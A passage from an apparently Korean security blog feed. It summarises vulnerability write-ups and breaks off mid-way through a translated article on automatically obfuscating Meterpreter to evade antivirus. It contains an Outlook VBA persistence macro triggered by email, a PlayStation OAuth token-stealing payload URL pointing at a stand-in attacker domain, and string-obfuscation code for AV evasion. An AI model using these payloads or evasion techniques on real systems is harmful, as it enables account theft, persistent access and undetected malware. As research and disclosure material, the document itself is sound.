    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> 에서 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experience의 GeForce 그래픽카드가 설치된 장비로 원격 게임을 지원하는 GAMESTREAM 기능에서 Local Privilege Escalation 취약점이 발견되었습니다.</p><p>nvcontainer.exe 프로세스는 user impersonation 없이 <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> 디렉터리에 <code>CaptureCore.log</code> 파일을 쓰거나 생성합니다. 이때 상위 폴더 상속으로 인해 모든 사용자는 해당 파일과 파일이 있는 폴더에 모든 권한을 갖습니다. 하지만 <code>CaptureCore.log</code> 파일을 삭제한 후 GAMESTREAM을 재시작하면 <code>nvspapi64.dll</code>에서 소프트 링크와 하드 링크에 대한 검사를 진행하여 심볼릭 링크 파일을 삭제합니다. 이 작업은 <code>nvspapi64.dll</code>에서 수행되는데 검사를 진행한 후 <code>CaptureCore.log</code>에 대한 핸들을 닫고 최종 경로를 가져와 작업을 수행하기 위해 다시 핸들을 엽니다.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>이를 활용하여 특정 파일에 대한 access event를 catch 하는 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>을 CaptureCore.log에 설정한 후 검사를 진행하면 OpLock이 트리거 되어 C:\Windows\System32 폴더에 arbitrary file creation이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
      <tag>idioth</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요. 하지 말라는 것은 더 하고 싶은 idioth입니다.</p><p>원래 사람은 하지 말라면 더 하고 싶은 법. 그래서 평소 탐지 우회하는 것에 대해 관심이 많은데 관련 글이 있길래 들고 왔습니다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>평소에는 그냥 혼자 공부하고 혼자 보는거라 직독직해 해놓고 스스로 머릿 속에서 정리하였는데 글로 적으려니 고생을 좀 했습니다. 영어 실력이 좋은 것도 아니고 번역을 많이 해본 것도 아니라 의역과 오역이 난무하는 글이 될 것 같습니다…</p><p>보시다가 이 부분은 왜 이렇게 번역이 됐지? 혹은 너무 이상한데? 하시는 것 있으시면 댓글로 달아드리면 눈물 흘리며 수정하도록 하겠습니다!</p><blockquote><p>원문 글 : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> 이 게시물은 모든 AV/EDR을 우회하기 위해 자동으로 Meterpreter을 refactoring 하는 것에 대해 설명한다. 모든 기술에 대한 아이디어와 문자열 난독화 패스의 구현이 상세히 설명되어있다. API import를 숨기는 것과 syscall 재작성에 대한 자세한 내용은 게시글이 너무 길어지므로 다음 글에서 소개할 것이다. 소스코드는 <a href="https://github.com/scrt/avcleaner">github</a>에서 확인할 수 있다.</p><p>기업이 정보 시스템을 보호하기 위해서 안티 바이러스와 EDR 같은 보안 소프트웨어는 필수적이다. 과거에는 모든 멀웨어 탐지 기술을 우회하기가 쉬웠지만 탐지 기술이 발전함에 따라 우회에 더 많은 노력이 필요하다.</p><p>취약점을 증명하기 위한 Proof-of-Concept가 안티 바이러스에 의해 차단된 경우 위험성에 대해 이야기하는 것은 매우 어렵다. 이론적으로 탐지를 우회하는 것이 가능하다고 얘기할 수 있지만 증명하기가 어렵다.</p><p> 또한 시스템의 existing foothold에서만 발견할 수 있는 취약점들이 있다. pentester가 initial level에 접근할 수 없는 경우 시스템의 실제 보안 상태를 도출할 수 없다.</p><p>따라서 안티바이러스 소프트웨어 우회는 필요하다. SCRT(필자의 팀)에서는 공개적으로 사용 가능한 오픈 소스 툴을 사용해 툴을 사용하는데 숙련된 누구나 따라 할 수 있으며 private 하고 비싼 툴에 의존하지 않아도 된다는 점을 강조한다.</p><h1 id="문제점"><a href="#문제점" class="headerlink" title="문제점"></a>문제점</h1><p>사람들은 안티 바이러스의 탐지가 정적인지 동적인지 분류하는 것을 좋아한다. 보통 실행 전에 트리거 되면 정적 탐지로 간주된다. 하지만 프로세스 생성, in-memory file downloads 같은 이벤트를 통해 멀웨어 실행 시 signature와 같은 정적 탐지 메커니즘이 호출될 수 있다는 것은 아는 것이 좋다. 모든 보안 소프트웨어에 Meterpreter를 사용하려면 다음과 같이 수정해야 한다.</p><ul><li>파일 시스템 스캔 혹은 메모리 스캔 중에 모든 static signature 우회</li><li>userland API hooking 우회와 관련된 “행동 탐지” 우회</li></ul><p>Meterpreter는 여러 모듈로 구성되며 전체 코드 베이스의 양이 많고 계속 업데이트되므로 private fork를 수행하기 힘들다. 따라서 자동으로 코드 베이스를 수정할 방법이 필요하다.</p><h1 id="해결-방안"><a href="#해결-방안" class="headerlink" title="해결 방안"></a>해결 방안</h1><p>멀웨어 탐지는 대부분 문자열, API hook, 혹은 둘의 조합을 기반으로 한다.</p><p>Cylance 같은 머신러닝 classifier를 구현하는 제품에서도 문자열, API import, 후킹 할 수 있는 API 호출이 없는 멀웨어는 탐지를 우회할 수 있다.</p><p>Meterpreter는 수천 개의 문자열을 가지고 있고 API imports는 어떠한 방법으로도 숨겨지지 않으며 <code>WriteProcessMemory</code> 같은 민감한 API는 userland API hook으로 쉽게 intercept 할 수 있다. 따라서 자동화된 방식을 사용하여 2개의 솔루션을 만들어야 한다.</p><ul><li>Source-to-source code refactoring</li><li>LLVM 컴파일 시 코드 베이스 난독화</li></ul><p>후자가 선호되는 방식이며 많은 유명한 연구들에서 같은 결론에 도달했다. transformation pass를 한 번 작성해서 소프트웨어의 프로그래밍 언어나 target architecture에 상관없이 재사용할 수 있기 때문이다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>이미지 출처: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>그러나 이 방법은 Visual Studio가 아닌 다른 컴파일러로 Meterpreter를 컴파일할 수 있어야 한다. 이를 수정하기 위해 2018년 12월에 몇 가지 작업을 퍼블리시했지만 1년이 더 지난 지금도 공식 코드 베이스에 적용되지 않았다.</p><p>그동안 우리는 첫 번째 접근법을 구현하기로 결정했다. 최첨단 소스 코드 refactoring를 살펴본 결과 <em>libTooling</em>(Clang/LLVM toolchain의 일부)이 C/C++ 소스의 구문 분석과 수정에 가장 적합했다.</p><p>Note: 코드 베이스는 Visual Studio 의존성이 강하기 때문에 Clang은 Meterpreter의 많은 부분의 구문 분석에 실패할 것이다. 그러나 타겟 안티바이러스를 50% 확률로 우회할 수 있었다. 또한 소스 코드를 변환하는 것이 컴파일 시에 변환하는 것보다 장점이 있을 것이다. 후자는 에러 없이 전체 프로젝트를 컴파일해야 하지만 전자는 수천 개의 컴파일 에러에 탄력적이며 불완전한 추상 구문 트리로 끝이 난다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="문자열-난독화"><a href="#문자열-난독화" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>C/C++에서 문자열은 다양한 context 안에 존재한다.</p><p><em>libTooling</em>을 사용하는 것은 복잡하므로 Meterpreter의 코드 베이스에서 의심스러운 문자열이 나타나는 부분을 보면 다음과 같다.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32는 다음 코드에서 <code>ntdll</code> 문자열을 의심스러운 문자열로 탐지한다.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>그러나 다음과 같이 코드를 재작성하면 성공적으로 탐지를 우회한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>첫 번째 코드는 <code>.rdata</code> 섹션에 <code>&quot;ntdll&quot;</code> 문자열이 저장돼서 안티바이러스에게 쉽게 발견된다. 두 번째 코드는 문자열이 실행 시 스택에 저장돼서 보통 정적으로 구분할 수 없다. <em>IDA Pro</em>와 같은 툴에서는 문자열을 탐지할 수 있지만 바이너리를 더 복잡하게 분석해야 한다.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreter의 코드 베이스에서 다음과 같은 구성은 <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>와 같은 파일에서 찾을 수 있다.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>이 문자열들은 <code>ext_server_espia_x64.dll</code>의 <code>.rdata</code> 영역에 평문으로 저장되고 <em>ESET Nod32</em>에서 탐지된다.</p><p>이 문자열들은 list initialzier에 위치한 매크로의 매개변수이다. 목표는 자동으로 위의 코드를 다음과 같이 재작성하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span 